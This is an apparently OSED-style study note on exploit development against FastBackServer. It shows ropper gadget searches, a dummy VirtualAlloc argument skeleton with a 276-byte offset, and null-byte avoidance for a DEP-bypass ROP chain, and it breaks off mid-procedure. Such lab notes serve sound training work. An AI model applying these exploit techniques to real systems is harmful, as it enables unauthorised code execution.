# Summary

## Get the offset

## Locate Gadgets

```bash
# List all available modules
lm m FastBackServer
# Find a module without any bad characters
```

## Prepare Dummy Shellcode

<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```python
# Example Dummy Shellcode
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
```

## Get ESP address on the stack

Get a copy of the address ESP points to on the stack. So initially this will be the address that points to the start of the shellcode (43434343). "MOV EAX, ESP ; RET" would be ideal but not likely found.&#x20;

{% code overflow="wrap" %}
```bash
ropper --file /home/kali/share/OSED/csftpav6.dll --search "push esp%pop%ret"
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Get VirtualAlloc Address

### Procedure

1. Find the address of VirtualAlloc in the module
2. Find the address of the dummy DWORD (45454545)
3. Resolve the VirtualAlloc address on the stack
4. Overwrite the dummy DWORD (45454545) with the resolved VirtualAlloc address

### Finding VirtualAlloc in the module

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```bash
# Using the module file with no bad characters find the VirtualAlloc
ropper --file /home/kali/share/OSED/csftpav6.dll --imports | grep VirtualAlloc
```

### Finding address of dummy DWORD

Crash the application with the usual AAAAA|BBBB|CCCCCCCC payload. Then use a command similar to the one below to find the exact offset.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
dd esp -1C
```
{% endcode %}

Ideal gadget is `sub esi, 0x1C` ; ret however this is probably not found. We could put 0x1C on the stack and then pop that into a register however 0x1C value is really 0x0000001C, which has NULL bytes in it. We get around this by using the negative value.&#x20;

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

```
? -0x1c
```

